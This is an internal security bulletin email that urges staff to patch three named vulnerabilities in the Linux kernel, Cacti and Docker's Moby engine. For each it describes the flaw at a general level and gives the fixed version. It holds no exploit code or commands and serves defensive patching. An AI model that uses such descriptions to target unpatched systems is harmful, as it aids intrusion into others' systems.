Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.
